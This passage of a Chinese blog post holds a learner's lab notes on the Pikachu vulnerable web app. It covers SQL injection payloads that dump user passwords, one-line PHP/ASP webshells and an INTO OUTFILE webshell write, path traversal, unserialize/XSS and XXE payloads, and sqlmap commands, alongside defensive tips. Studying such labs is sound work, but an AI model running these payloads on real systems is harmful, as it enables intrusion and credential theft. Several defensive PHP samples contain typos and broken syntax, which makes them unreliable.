updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错4.png" alt="sql报错4" style="zoom:60%;" />
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错5.png" alt="sql报错5" style="zoom:60%;" />
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错6.png" alt="sql报错6" style="zoom:60%;" />
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql报错7.png" alt="sql报错7" style="zoom:60%;" />
-
-<blockquote>
-<p><strong>疑问</strong>：</p>
-</blockquote>
-<p>之后的注入语句看不太懂…查看通关参考：<a href="https://wuyandao.blog.csdn.net/article/details/121692906">https://wuyandao.blog.csdn.net/article/details/121692906</a></p>
-<h5 id="”http-header”注入"><a href="#”http-header”注入" class="headerlink" title="”http header”注入"></a>”http header”注入</h5><blockquote>
-<p><strong>疑问</strong>：修改User-Agent，为何这样改？</p>
-</blockquote>
-<p>获取客户端的http header信息并用SQL进行处理，可验证客户端头信息（如常用的cookie验证）或者通过http header头信息获取客户端的一些信息（如useragent、accept字段等）。</p>
-<p>获取HTTP头数据，修改User-Agent为<code>firefox&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</code></p>
-<h5 id="盲注（base-on-boolian）"><a href="#盲注（base-on-boolian）" class="headerlink" title="盲注（base on boolian）"></a>盲注（base on boolian）</h5><p>后台使用错误消息屏蔽方法（比如@）屏蔽报错后，无法再根据报错信息进行注入的判断，此时就是<strong>盲注</strong>。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p>
-<p>在正确的输入下，输入and 1= 1/and 1= 2可以进行判断。</p>
-<p><strong>PHP屏蔽错误的方法</strong></p>
-<ol>
-<li>@屏蔽法（@在php中是一个抑制错误的符号）</li>
-</ol>
-<p>即便开启了报错功能，只要在错误语句前加上@符号，便可屏蔽错误信息。使用@抑制错误之前，会出现一个警告错误。</p>
-<ol start="2">
-<li>error_reporting屏蔽法</li>
-</ol>
-<p>在php文件开始之前，可加上error_reporting(0); 这个函数的意思是设置PHP报错级别并返回当前级别，0代表禁用错误报告。</p>
-<ol start="3">
-<li>display_errors屏蔽法</li>
-</ol>
-<p>前两种方法只能作用于单行或单个文件，这个则是作用于所有php文件。打开php.ini文件，搜索display_errors = on（默认应该是on，即开启报错功能），改为off即可。</p>
-<p>输入<code>kobe&#39; and 1=2#</code>，显示不存在，说明有漏洞。输入<code>kobe&#39; and ascii(substr(database(),1,1))&gt;111#</code>，112对应字母p（数据库名第一个字符），依次修改得数据库名。</p>
-<h5 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h5><p>boolian base还可以看到0或1的回显，time base是啥都看不到了，只可通过特定的输入，判断后台执行的时间。输入<code>kobe&#39; and sleep(5)#</code>，打开web控制器，查看网络，发现暂停了5秒。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\web.png" alt="web" style="zoom:50%;" />
-
-<p><code>kobe&#39; and if((substr(database(),1,1))=&#39;p&#39;,sleep(5),null)#</code>时间暂停了5秒，说明第一个字符是p。</p>
-<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><h5 id="常见防范措施"><a href="#常见防范措施" class="headerlink" title="常见防范措施"></a>常见防范措施</h5><ol>
-<li>代码层面：对输入进行严格转义和过滤；使用预处理和参数化。</li>
-<li>网路层面：通过WAF设备启用防SQL Inject注入策略（类似防护系统）；云端防护（360网站卫士，阿里云盾等）。</li>
-</ol>
-<blockquote>
-<p>WAF：Web Application Firewall - Web应用防护系统</p>
-</blockquote>
-<p><strong>PHP防范转义+过滤</strong></p>
-<p>转义实例</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params"><span class="variable">$link</span>, <span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_ <span class="keyword">string</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> mysqli_ real_ escape_ <span class="keyword">string</span>(<span class="variable">$ink</span>, <span class="variable">$data</span>) ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(is_ <span class="keyword">array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$va1</span>)&#123; </span><br><span class="line">			<span class="variable">$data</span>[<span class="variable">$key</span>]=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$val</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>过滤实例（黑名单）：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">str_ <span class="title function_ invoke__">replace</span>(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;,<span class="subst">$_</span> POST[&#x27;username ]),把post里面的数据里面含有%的替换成空</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>PDO预处理</strong>（预处理+参数化）</p>
-<blockquote>
-<p><strong>疑问</strong>：这个没看懂</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=<span class="variable">$_</span> GET[ <span class="string">&#x27; username&#x27;</span> ];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_</span> GET[ <span class="string">&#x27; password&#x27;</span>];</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>( <span class="string">&#x27; mysql : host=localhost ; dbname-ant&#x27;</span>, <span class="string">&#x27; root&#x27;</span>，<span class="string">&#x27; root&#x27;</span>);</span><br><span class="line"><span class="variable">$sq1</span>=<span class="string">&quot;select * from admin where username=? and passowrd=?&quot;</span> ;</span><br><span class="line"><span class="variable">$stmt</span>=<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span> (<span class="variable">$sql</span>);<span class="comment">//先不传参数，先预处理</span></span><br><span class="line"><span class="comment">//var_ dump($stmt);</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt; <span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="variable">$username</span> ，<span class="variable">$password</span>));</span><br><span class="line">/ /这个时候在把参数传进去，以索引数组的方式传进去，而不是拼接，就成功防止了注入</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$e</span>- &gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PDO：PHP Data Objects。一种在PHP里连接数据库的使用接口。基于数据库使用的安全性，它与mysqli曾经被建议用来取代原本PHP在用的mysql相关函数，因为后者欠缺对于SQL注入的防护。</p>
-</blockquote>
-<p><strong>网络防护</strong></p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\网络防护1.png" alt="网络防护1" style="zoom:67%;" />
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\网络防护2.png" alt="网络防护2" style="zoom: 62%;" />
-
-<blockquote>
-<p>SDN：Software Defined Network</p>
-</blockquote>
-<h5 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h5><h6 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h6><ol>
-<li><p>查询列数</p>
-</li>
-<li><p>查询指定信息</p>
-<blockquote>
-<p>Select version(); //取的数据库版本<br>Select database(); //取得当前的数据库名<br>Select user(); //取得当前登录的用户<br>order by X //对查询的结果进行排序,按照第X列进行排序，默认数字0-9 ,字母a-z</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a<span class="string">&#x27; union select database(),user()#</span></span><br></pre></td></tr></table></figure>
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql1.png" alt="sql1" style="zoom:55%;" />
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a<span class="string">&#x27; union select version(),4#</span></span><br></pre></td></tr></table></figure>
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\sql2.png" alt="sql2" style="zoom:55%;" /></li>
-</ol>
-<h6 id="information-schema"><a href="#information-schema" class="headerlink" title="information_ schema"></a>information_ schema</h6><p>mysql自带的information_schema表里存放了大量重要信息。具体如下：<br>如果存在注入点的话，可以直接尝试对该数据库进行访问，从而获取更多的信息。<br>比如：<br><strong>SCHEMATA表</strong>：提供了当前mysql实例中所有数据库的信息。<code>show databases</code>结果取之此表。<br><strong>TABLES表</strong>：提供了数据库中表的信息（包括视图）。详细表述了某个表属于哪个schema，以及表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code>结果取之此表。<br><strong>COLUMNS表</strong>：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code>结果取之此表。</p>
-<p>想要获取information_ schema中的数据，至少要知道数据库名称（上面联合查询里查过了）。通过union联合查询，通过information_ schema获取pikachu一共有多少个表，表的名称是什么。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\blog\coriiiander\source_posts\pictures\sql查表.png" alt="sql查表"></p>
-<p>我们猜测所有的用户名密码都在users中。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; union select table_name,column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\blog\coriiiander\source_posts\pictures\sqlUser.png" alt="sqlUser"></p>
-<p>拿到账号密码并解密</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; union select username,password from users#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\blog\coriiiander\source_posts\pictures\sqlPassword.png" alt="sqlPassword"></p>
-<h6 id="os远程控制"><a href="#os远程控制" class="headerlink" title="os远程控制"></a>os远程控制</h6><blockquote>
-<p><strong>疑问</strong>：PHP与ASP语言不懂，不明白这个语句为什么是<strong>获取操作系统权限</strong>的？用的buu环境，修改phpstudy下my.ini文件还是会报错</p>
-</blockquote>
-<p><strong>一句话木马</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP: &lt; ?php @<span class="keyword">eval</span>(<span class="variable">$_</span> POST’chopper’]);<span class="meta">?&gt;</span></span><br><span class="line">ASP: &lt; %<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot; chopper&quot;</span>)%&gt;</span><br><span class="line">ASP.NET: &lt;%@ Page Language= Jscript<span class="string">&quot; %&gt; &lt;%eval(Request.Item&quot;</span>chopper<span class="string">&quot;], &quot;</span>unsafe );%&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>ASP：Active Server Pages，可用来创建动态交互式网页并建立强大的web应用程序。</p>
-</blockquote>
-<p>在一些没有回显的注入中可使用”into outfile”将结果写入到指定文件，然后访问获取。获取操作系统权限：<code>kobe&#39; union select &quot;&lt;?php @eval($_GET[&#39;test&#39;])?&gt;&quot;,2 into outfile &quot;/val/www/html/1.php&quot;#</code></p>
-<p><strong>前提条件：</strong></p>
-<ol>
-<li>需要知道远程目录</li>
-<li>需要远程目录有写权限</li>
-<li>需要数据库开启了secure_ file_ priv</li>
-</ol>
-<blockquote>
-<p><strong>secure_ file_ priv</strong>：</p>
-<p>NULL - 限制mysqld不允许导入或导出。</p>
-<p>/tmp - 限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。</p>
-<p>没有值 - 不限制mysqld在任意目录的导入导出。</p>
-<p>在MySql的my.ini文件中进行修改（若无，则在[mysqld]下增加secure_ file_ priv=””）</p>
-</blockquote>
-<h6 id="暴力破解表-列名"><a href="#暴力破解表-列名" class="headerlink" title="暴力破解表/列名"></a>暴力破解表/列名</h6><p>输入payload <code>kobe&#39; and exists(select * from aa)#</code>，返回结果说明没有这个表。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\暴力破解表.png" alt="暴力破解表" style="zoom: 67%;" />
-
-<p>抓包，对GET而非HTTP处的aa进行破解。</p>
-<p><img src="D:\blog\coriiiander\source_posts\pictures\aa.png" alt="aa"></p>
-<p>知道表名后，用<code>kobe&#39; and exists(select id from users)#</code>爆破列名。</p>
-<h6 id="用SQL-Map进行SQL-Inject漏洞测试"><a href="#用SQL-Map进行SQL-Inject漏洞测试" class="headerlink" title="用SQL-Map进行SQL Inject漏洞测试"></a>用SQL-Map进行SQL Inject漏洞测试</h6><p>官网下载压缩包<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
-<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">-<span class="keyword">u</span> &quot;xx” - cookie= “yy” <span class="comment">//带上cookie对URL进行注入探测</span></span><br><span class="line">-<span class="keyword">U</span> “xxx” – cookie=“yyy” - current-<span class="keyword">db</span> <span class="comment">//对数据库名进行获取</span></span><br><span class="line">-<span class="keyword">u</span> &quot;xxx” --cookie= “yy” - <span class="keyword">D</span> pikachu - -tables <span class="comment">//对数据库的表名进行枚举</span></span><br><span class="line">-<span class="keyword">u</span> “xxx” --cookie= “yyy” -<span class="keyword">D</span> pikachu -T users – columns <span class="comment">//对dvwa库里面的名为users表的列名进行枚举</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>RCE - remote command / code execute. 攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
-<p><strong>远程系统命令执行</strong></p>
-<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。</p>
-<p>很多企业都开始实施自动化运维，大量的系统操作会通过”自动化运维平台”进行操作，漏洞很多。</p>
-<p><strong>远程代码执行</strong></p>
-<p>后台把用户的输入作为代码的一部分进行执行造成了远程代码执行漏洞（使用了代码执行的函数 / 不安全的反序列化等）。因此，如果需要给前端用户提供操作类的API接口，要对接口输入内容进行严格判断（实施严格的白名单策略等）。                  </p>
-<blockquote>
-<p><strong>疑问</strong>：不会做，输入ping也没反应。</p>
-</blockquote>
-<h4 id="Files-Inclusion"><a href="#Files-Inclusion" class="headerlink" title="Files Inclusion"></a>Files Inclusion</h4><p>文件包含是一个功能。各种开发语言中都提供了内置的文件包含函数，开发人员可以在一个代码文件中直接包含（引入）另外一个代码文件。比如PHP提供的<code>include()</code> <code>include_once()</code> <code>require()</code> <code>require_once()</code>，还有把一系列功能函数写进fuction.php，文件调用时在文件头写上<code>&lt;?php include fuction.php?&gt;</code>。大多文件包含函数中包含的代码文件是固定的，但若该文件被写成一个变量且可由前端用户传进来，就存在一定的风险。</p>
-<blockquote>
-<p>include和require语句错误处理方面之外都是相同的：</p>
-<p>require会生成致命错误(E_ COMPILE ERROR)并停止脚本；include只生成警告(E WARNING )，脚本会继续。</p>
-</blockquote>
-<p>根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
-<ol>
-<li>本地文件包含漏洞：仅能对服务器本地的文件进行包含，由于攻击者并不能控制服务器上的文件，因此该情况下，会同时攻击固定的系统配置文件以读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞形成更大的威力。</li>
-<li>远程文件包含漏洞：能够通过url地址对远程的文件进行包含，意味着攻击者可以传入任意的代码。</li>
-</ol>
-<img src="D:\blog\coriiiander\source\_posts\pictures\Files Inclusion.png" alt="Files Inclusion" style="zoom:67%;" />
-
-
-
-<h5 id="local"><a href="#local" class="headerlink" title="local"></a>local</h5><blockquote>
-<p><strong>疑问</strong>：我的没爆出配置文件。</p>
-</blockquote>
-<p>观察url<code>...buuoj.cn:81/vul/fileinclude/fi_local.php?filename=file2.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code>，文件名<code>filename=file2.php</code>从前端传向后端，将其修改为<code>../../../../Windows/System32/drivers/etc/hosts</code>，爆出所有配置文件。</p>
-<h5 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h5><blockquote>
-<p><strong>疑问</strong>：什么叫“如果使用的incldue和require”？buu环境读不了pikachu/test/yijuhua.txt。</p>
-</blockquote>
-<p><strong>远程包含漏洞前提</strong>：如果使用的incldue和require，则需要php.ini配置如下( php5.4.34 ) ：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=on    <span class="comment">//默认打开</span></span><br><span class="line">Allow_url_include=on  <span class="comment">//默认关闭</span></span><br><span class="line"><span class="comment">//magic quotes_ gpc=off</span></span><br></pre></td></tr></table></figure>
-
-<p>phpstudy打开”远程包含“，打开远程文件路径读取<code>http://pikachu/test/yijuhua.txt</code>。</p>
-<h4 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h4><p><strong>下载过程</strong>：点击下载链接，向后台发送下载请求（请求包含需要下载的文件名称），后台收到请求后开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。</p>
-<p>后台收到请求的文件名后将其直接拼进下载文件的路径中而不对其进行安全判断，则可能引发不安全的文件下载漏洞。攻击者提交的不是程序预期的文件名，而是一个精心构造的路径（如../../../etc/passwd），则很有可能会直接将该指定的文件下载下来。</p>
-<p>所有与前端交互的数据都是不安全的！</p>
-<p>点击下载后url变为<code>...buuoj.cn:81/vul/unsafedownload/execdownload.php?filename=kb.png</code>，也即把kb.png传到后台，后台找到文件，读取后传到前端下载。</p>
-<p><strong>防范措施</strong>：</p>
-<ol>
-<li>对传入的文件名进行严格过滤和限定</li>
-<li>对文件下载的目录进行严格限定</li>
-</ol>
-<h4 id="Unsafe-file-uploads-不安全的文件上传"><a href="#Unsafe-file-uploads-不安全的文件上传" class="headerlink" title="Unsafe file uploads(不安全的文件上传)"></a>Unsafe file uploads(不安全的文件上传)</h4><p>后台会对上传的文件进行判断是否是指定的类型、后缀名、大小等，然后将其按照特定格式进行重命名后存储在指定的目录。</p>
-<ul>
-<li>验证文件类型、后缀名、大小</li>
-<li>验证文件的上传方式</li>
-<li>对文件进行一定复杂的重命名</li>
-<li>不要暴露文件上传后的路径</li>
-</ul>
-<p><strong>文件上传漏洞测试流程</strong>：</p>
-<ol>
-<li><p>对文件上传的地方按照要求上传文件，查看返回结果（路径，提示等）</p>
-</li>
-<li><p>尝试上传不同类型的“恶意”文件，比如xx.php文件，分析结果</p>
-</li>
-<li><p>查看html源码，看是否通过js在前端做了上传限制，可以绕过</p>
-</li>
-<li><p>尝试使用不同方式进行绕过：黑白名单绕过/MIME类型绕过/目录0x00截断绕过等</p>
-</li>
-<li><p>猜测或者结合其他漏洞（比如敏感信息泄露等）得到木马路径，连接测试</p>
-</li>
-</ol>
-<blockquote>
-<p>webshell：webshell是以asp、php、jsp或cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。</p>
-</blockquote>
-<h4 id="Over-Permisson-越权漏洞"><a href="#Over-Permisson-越权漏洞" class="headerlink" title="Over Permisson(越权漏洞)"></a>Over Permisson(越权漏洞)</h4><h4 id=""><a href="#" class="headerlink" title="../../../"></a>../../../</h4><p>形成原因和Unsafe Filedownload差不多，后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。如果通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%E7%A7%B0%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%8C%E8%80%8C%E5%B9%B6%E4%B8%8D%E5%BD%92%E4%B8%BA%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件称为敏感信息泄露，而并不归为目录遍历漏洞。</a></p>
-<h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><ul>
-<li>通过访问url下的目录，可以直接列出目录下的文件列表</li>
-<li>输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息</li>
-<li>前端的源码（html css js）里包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等</li>
-</ul>
-<p>不用登录，直接输入url<code>...buuoj.cn:81/vul/infoleak/abc.php</code>就可进入。</p>
-<h4 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h4><blockquote>
-<p><strong>疑问</strong>：没看懂漏洞举例，怎么判断PHP反序列化漏洞，以及怎么构造的这个输入。</p>
-</blockquote>
-<p>php中serialize()，unserialize()两个函数：</p>
-<p><strong>序列化serialize()</strong></p>
-<p>把一个对象变成字符串，方便传输和存储。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line">   <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">   序列化后得到的结果是这个样子的:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">       O:代表<span class="keyword">object</span></span><br><span class="line">       <span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">       S:对象的名称</span><br><span class="line">       <span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">       s:数据类型</span><br><span class="line">       <span class="number">4</span>:变量名称的长度</span><br><span class="line">       test:变量名称</span><br><span class="line">       s:数据类型</span><br><span class="line">       <span class="number">7</span>:变量值的长度</span><br><span class="line">       pikachu:变量值</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>反序列化unserialize()</strong></p>
-<p>把被序列化的字符串还原为对象，以便之后继续被代码处理。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure>
-
-<p>序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">    <span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line">    <span class="title function_ invoke__">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line">    <span class="title function_ invoke__">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line">    <span class="title function_ invoke__">__sleep</span>() 在对象在被序列化之前运行</span><br><span class="line">    __wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">漏洞举例:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    @<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>输入<code>O:1:&quot;s&quot;:1:&#123;s:4:&quot;test&quot;;s:30:&quot;&lt;script&gt;alert(&#39;fxlh&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
-<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><blockquote>
-<p><strong>疑问</strong>：XML代码后面的都不是很懂，PHP语法的问题？</p>
-</blockquote>
-<p>XML External Entity attack - XML外部实体注入漏洞。</p>
-<blockquote>
-<p>XML：可扩展标记语言</p>
-</blockquote>
-<p>攻击者通过向服务器注入指定的xml实体内容让服务器按照指定的配置进行执行。现在很多语言中对应的解析xml的函数默认禁止解析外部实体内容，从而直接避免了这个漏洞。以PHP为例，它解析xml用的是libxml，libxml≥2.9.0的版本中默认禁止解析xml外部实体内容（可通过手动指定LIBXML_NOENT选项开启xml外部实体解析）。</p>
-<p>xml：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--第一部分: XML声明-- &gt;</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--第二部分:文档类型定义DTID- &gt;</span><br><span class="line">&lt;!DOCTYPE note[ &lt;!--定义此文档是 note类型的文档--&gt; </span><br><span class="line">&lt;!ENTITY entity - name SYSTEM <span class="string">&quot;URL/URL&quot;</span>&gt; &lt;!- 外部实体声 明--&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;<span class="number">1</span>--第三部分:文档元&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;<span class="keyword">from</span>&gt; Tom&lt;/<span class="keyword">from</span>&gt;</span><br><span class="line">&lt;head&gt; Reminder &lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD - Document Type Definition 文档类型定义，用来为XML文档定义语义约束。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.DTD内部声明</span><br><span class="line">&lt;!DOCTYPE 根元素[元素声明]&gt;</span><br><span class="line"><span class="number">2</span>. DTD外部引用</span><br><span class="line">&lt;!DOCTYPE根元素名称SYSTEM “<span class="string">&quot;外部DTD的URI&quot;</span> &gt;</span><br><span class="line"><span class="number">3</span>.引用公共DTD</span><br><span class="line">&lt;!DOCTYPE根元素名称PUBLIC <span class="string">&quot;DTD标识名” “公用DTD的URI” &gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>构造</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version = <span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE note [     &lt;!ENTITY hacker <span class="string">&quot;xxe&quot;</span>&gt; ]&gt; </span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="不安全的URL重定向"><a href="#不安全的URL重定向" class="headerlink" title="不安全的URL重定向"></a>不安全的URL重定向</h4><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。</p>
-<p>将最后一个链接的url<code>...buuoj.cn:81/vul/urlredirect/urlredirect.php?url=i</code>后面多的<code>?url=i</code>进行修改，改成<code>...buuoj.cn:81/vul/urlredirect/urlredirect.php?url=https://www.baidu.com/</code>就跳转到<code>https://www.baidu.com/</code>的界面了。</p>
-<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><blockquote>
